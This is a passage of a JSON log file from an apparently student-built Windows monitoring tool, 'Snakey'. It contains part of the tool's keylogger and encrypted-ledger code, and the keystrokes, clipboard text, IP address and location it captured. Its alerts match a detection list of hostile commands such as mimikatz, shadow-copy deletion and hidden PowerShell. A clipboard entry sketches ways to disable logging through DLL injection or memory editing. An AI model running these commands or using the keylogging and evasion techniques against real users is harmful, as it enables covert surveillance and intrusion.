\"Keylogger session completed.\")\n    except Exception as e:\n        log_daemon_message(\"ERROR\",\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\n        if listener:  # Attempt to stop listener cleanly even on error\n            try:\n                listener.stop()\n            except Exception as stop_e:\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\n\n    session_log[\"keystrokes\"] = ''.join(keys)\n\n    # Important Directories Check\n    session_log[\"important_dirs\"] = check_important_directories()\n\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\n    if session_log[\"alerts\"] is None:\n        session_log[\"alerts\"] = []\n\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\n    # 1. Prepare the full log for encryption\n    # We will hash the raw JSON string content of the log before encryption\n    # This hash acts as an internal integrity check within the log itself\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\n\n    # 2. Encrypt the entire session log\n    try:\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\n\n        # 3. Define unique filename for encrypted log file\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\n\n        # 4. Save the encrypted log to a file\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\n            f_enc.write(encrypted_log_data)\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\n\n        # 5. Hash the encrypted file content (for the blockchain ledger)\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\n        if not encrypted_file_hash:\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\n            return session_log  # Exit without updating ledger for this log\n\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\n        try:\n            ledger = []\n            if os.path.exists(hash_ledger_path):\n                try:\n                    with open(hash_ledger_path, \"r\") as f:\n                        ledger = json.load(f)\n                    # Convert legacy format if needed\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\n                        converted_ledger = []\n                        prev_h = \"0\" * 64\n                        for h in ledger:\n                            converted_ledger.append({\n                                \"timestamp\": current_time.isoformat(),\n                                # Cannot determine true timestamp for old entries\n                                \"encrypted_file_hash\": h,\n                                \"previous_encrypted_file_hash\": prev_h,\n                                \"chained_hash\": hash_text(h + prev_h),\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\n                            })\n                            prev_h = h\n                        ledger = converted_ledger\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\n                except json.JSONDecodeError:\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\n                    ledger = []\n            else:\n                ledger = []\n\n            try:\n                previous_encrypted_file_hash = ledger[-1].get(\"encrypted_file_hash\", \"0\" * 64) if ledger else \"0\" * 64\n            except Exception as e:\n                log_daemon_message(\"ERROR\", f\"Ledger appears malformed. Could not read last encrypted_file_hash: {e}\")\n                previous_encrypted_file_hash = \"0\" * 64\n\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\n            chained_hash = hash_text(chained_hash_input)\n\n            ledger_entry = {\n                \"timestamp\": current_time.isoformat(),\n                \"encrypted_file_hash\": encrypted_file_hash,\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\n                \"chained_hash\": chained_hash,\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\n            }\n\n            ledger.append(ledger_entry)\n\n            with open(hash_ledger_path, \"w\") as f:\n                json.dump(ledger, f, indent=4)\n\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\n\n            # 7. Update Merkle Root\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\n\n            with open(merkle_root_path, \"w\") as f:\n                f.write(merkle_root)\n\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\n\n        except Exception as e:\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\n\n    except Exception as e:\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\n\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\n    return session_log\n\n\n# === Main Daemon Loop ===\nif _name_ == \"_main_\":\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\n\n    # Initial check for stop file in case it exists from a previous run\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\n    if os.path.exists(stop_file_path):\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\n        try:\n            os.remove(stop_file_path)\n        except Exception as e:\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\n\n    while True:\n        if check_stop_file():\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\n            break\n\n        session_log = collect_full_session()\n\n\n        log_to_wazuh_file(session_log)\n        send_to_elasticsearch(session_log)\n\n        log_daemon_message(\"INFO\", f\"Sleeping for 1 second before next collection at {datetime.now().isoformat()}...\")\n        time.sleep(1)\n\n    # Final cleanup of stop file\n    if os.path.exists(stop_file_path):\n        try:\n            os.remove(stop_file_path)\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\n        except Exception as e:\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "[ctrl_l]\u0001[ctrl_l]\u0003how to test for exetr[BACKSPACE][BACKSPACE][BACKSPACE]ter[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]here's the tests i did, i tampered with the hash and it detected it, i cha[BACKSPACE][BACKSPACE][BACKSPACE]ip hopped mid captue[BACKSPACE]re and it alerted for the change in country, giv eme [BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]e me ideas for a thrid[BACKSPACE][BACKSPACE][BACKSPACE]ird test for snakey please[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os import time import json import socket import getpass import hashlib import platform from d...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9f94910f2b3980a5cdb361faec1af24f4a1f95cea2b9620ecde2d848a787f04d", "screenshot_hash": "e46bf4dde1919d8ae9e110bc11caed43f7bf29133271f5c944aeb05d7d2dae2b", "_raw_log_hash": "5938e4d33b7bcf37b5ec256e9738f7cef732171df7a7fedacbaa11ba532f7635"}
{"timestamp": "2025-06-23T09:37:40.818215+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Professor, o snakey tem uma fun\u00e7\u00e3o onde este vai buscar o hash do screenshot que capturou e envia-lo como um log, ", "keystrokes": "cheat engih[BACKSPACE][ctrl_l]\u0001[caps_lock][TAB]c[caps_lock]hec[caps_lock][BACKSPACE]c[caps_lock]heat[shift_r]_[caps_lock]e[caps_lock]ngine[ctrl_l][shift]\u0003[ctrl_l]\u0016[shift_r][ENTER][ENTER][ENTER][ENTER]Explain[ENTER]c[BACKSPACE]should i make a copy of snkaey [BACKSPACE][BACKSPACE]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "d689f1f09fe0287abafc9107c47cca1fd5332822306ec733c45ca854dff2357f", "screenshot_hash": "acfb41efc9ff5d7d848f6b61d1819287c7ec002e555c126b525abc9266443905", "_raw_log_hash": "a1d5d2e9c6ab8c04edf074ded4a59095e5a697bcd392ccc0899f723babf34661"}
{"timestamp": "2025-06-23T09:40:07.203777+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Tool Setup:\r\n\r\nUse a tool like Cheat Engine (Windows) or LD_PRELOAD (Linux) to:\r\nAttach to Snakey\u2019s process and modify its memory (e.g., flip a flag that disables logging).\r\nInject a DLL or shared library to hijack its functions (e.g., hook WriteFile calls to block log writes).", "keystrokes": "like this will it late[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]alter my program[ENTER]an easier the[BACKSPACE][BACKSPACE]est please[ENTER]how sweaty ill make you mmmm[ENTER]it didnt say anything when i erased the log[ctrl_l]\u0001[BACKSPACE] i would like it to ", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "620a12c95b1a1ddd54a8f6b45606dd5d3fd97587b2bd759eab0c5c9ca7a6a893", "screenshot_hash": "50d3b99605ec0e25196afaf2e05d2c323281093708be204f2f85be1b83b2c5c8", "_raw_log_hash": "2c2352f9ebd7a732b10a0b40043cac4e2fd6fed7ab9615f3753fce25091e4538"}
{"timestamp": "2025-06-23T09:42:33.730182+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Tool Setup:\r\n\r\nUse a tool like Cheat Engine (Windows) or LD_PRELOAD (Linux) to:\r\nAttach to Snakey\u2019s process and modify its memory (e.g., flip a flag that disables logging).\r\nInject a DLL or shared library to hijack its functions (e.g., hook WriteFile calls to block log writes).", "keystrokes": "was deleted[shift_r][ENTER][ENTER]i want it to even if we kill its process through cm[BACKSPACE][BACKSPACE]task manager [shift_r](python[shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r][shift_r]) it will come back[ENTER]stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "620a12c95b1a1ddd54a8f6b45606dd5d3fd97587b2bd759eab0c5c9ca7a6a893", "screenshot_hash": "89f438f21f58c2c6ca217c78566f50114956ed9170d84f58b8f61b2e5102fa77", "_raw_log_hash": "4b035bab31ee119fa10dee240d07eed6cb250dca07115bfcc40e38951871eebf"}
{"timestamp": "2025-06-23T10:14:17.237874+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:14:17.763290+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "if __name__ == \"__main__\":\r\n", "keystrokes": "what abpui[BACKSPACE][BACKSPACE][BACKSPACE]po[BACKSPACE][BACKSPACE]out introduxin[BACKSPACE][BACKSPACE][BACKSPACE]cing the op[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]lets now t[BACKSPACE]do the functo[BACKSPACE]ion to detect fi[BACKSPACE][BACKSPACE]what vpn theyre using pls[ENTER][BACKSPACE][caps_lock]pt[ctrl_l]\u0003[ctrl_l][BACKSPACE][BACKSPACE][ctrl_l]\u0016[BACKSPACE]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f59ced0cbcd764a74d037fc55dfa59e39d9853f157957de9e8c09f3ecabb9fb7", "screenshot_hash": "ab72eab415e226c347e7f3a8ee3cf5089ce6db097c5d637501741cfc306377de", "_raw_log_hash": "f994fcb942a83608669316e90006754b57952435f2e55c8fd060a09bed5ac3ee"}
{"timestamp": "2025-06-23T10:24:15.094823+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:24:17.177653+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "pytz-2025.2", "keystrokes": "[ctrl_l]\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7afdb837fb4bf44bc372f0e9b409c3a90d0927ef89388916d5093b9a97905ca0", "screenshot_hash": "993064fbdc2c8903320e1e6af148e705710fc08b1ba24df1782243eefe833ec5", "_raw_log_hash": "8485ed2c0b3ee08181484ba76c5efb25a66ffec37f06513395cf180cad3951b9"}
{"timestamp": "2025-06-23T10:26:48.347141+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:26:48.763990+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "5b2a0ab70ffdb5d038aea387d93a6850a55dcb1c74645ce3176073f8470fcd90", "_raw_log_hash": "d0f3dff797e0a0e796ed3cfad149990c24050cd98389dced86b2079f7839ec5d"}
{"timestamp": "2025-06-23T10:29:16.905907+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:29:30.582223+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "7bcbf43df699c4187ceaeea7ca327d4e8155d33d8dc4fec3880ce1bc184a1209", "_raw_log_hash": "a08aa572b37b161cfdd606e7190626d823b58e8ac67199ac9e2158a4dff992f1"}
{"timestamp": "2025-06-23T10:31:25.870389+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:31:27.586918+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "stio[BACKSPACE][BACKSPACE]op[shift_r]_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "8304df8023b09df1930f21ab2fe7f25e7da5ecfa5367dbb0e834eb7e0cf3f756", "_raw_log_hash": "6ff20376ed59f226778d23b2dffa55959061da67933cff40e9cdf32ad324f913"}
{"timestamp": "2025-06-23T10:33:54.251590+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-23T11:33:55.259307+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "1a0ce3a8578890891bf2cc6952ac437b07aab6c94b972b446f6337d387ff74b0", "screenshot_hash": "f07d7414a9bc954d1b763aa8c74cd849edb29ec5d7149ed3a98abae58a2135b6", "_raw_log_hash": "e9fddfd0932998dc26310e17981c82939c58f7e420ba2c04af47eb4f30942fb1"}
{"timestamp": "2025-06-24T09:30:53.509508+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "local_time": "2025-06-24T10:30:54.905875+01:00", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "stop[shift_r]_sdnake[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]nakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (826 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (114 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6fc375d8af4f715edbbf0759b938fc18986aa59d6dde85450608f7883433c5c4", "_raw_log_hash": "8a6233569bc6dfba4b0ad27231bc52c77c488dc3902cde877eb43971f91e4f53"}
